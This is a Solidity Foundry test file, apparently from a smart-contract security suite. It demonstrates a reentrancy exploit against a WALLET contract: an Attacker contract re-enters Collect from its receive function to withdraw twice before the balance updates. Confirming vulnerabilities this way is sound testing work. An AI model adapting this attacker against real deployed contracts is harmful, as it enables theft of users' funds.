
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/WALLET.sol";

contract TestReentrancyWALLET is Test {
    WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinSum is 1 ether. We need at least 1 ether to deposit.
        // We limit to a reasonable range to avoid overflow issues.
        vm.assume(attackVal >= 1 ether && attackVal <= 100 ether);
        // Ensure attackVal is even for clean division in this specific exploit scenario
        attackVal = (attackVal / 2) * 2; 

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state setup needed on the contract itself beyond deployment.

        // --- 3. Funding ---
        // Fund the victim with enough ETH to cover the withdrawals.
        vm.deal(address(_contractUnderTest), attackVal * 2); 
        
        // Fund the test contract so it can fund the attacker
        vm.deal(address(this), attackVal);

        // --- 4. Trigger Attack ---
        // Setup: Deposit the full attackVal
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Time travel: Put(0) sets unlockTime to block.timestamp.
        // Collect requires block.timestamp > unlockTime.
        vm.warp(block.timestamp + 10);

        // Attack: Try to withdraw attackVal in two halves via reentrancy
        // This bypasses the MinSum check for the second half if attackVal is small (e.g. 1 ETH).
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    WALLET public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public amountPerCall;
    uint256 public initialBalance;

    constructor(address victimAddress) { 
        victim = WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        // Deposit the full amount. 
        // This sets Acc[this].balance = val.
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        initialBalance = address(this).balance;
        amountPerCall = val / 2;

        // Start the attack by withdrawing half.
        // We expect to re-enter and withdraw the other half.
        victim.Collect(amountPerCall);

        // Verification
        // If successful, we should have received val (amountPerCall * 2) back.
        if (address(this).balance >= initialBalance + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        // We want exactly one re-entrant call
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter to withdraw the second half.
            // At this point, state.balance hasn't been updated yet, 
            // so checks (balance >= MinSum) pass using the old balance.
            victim.Collect(amountPerCall);
        }
    }
}
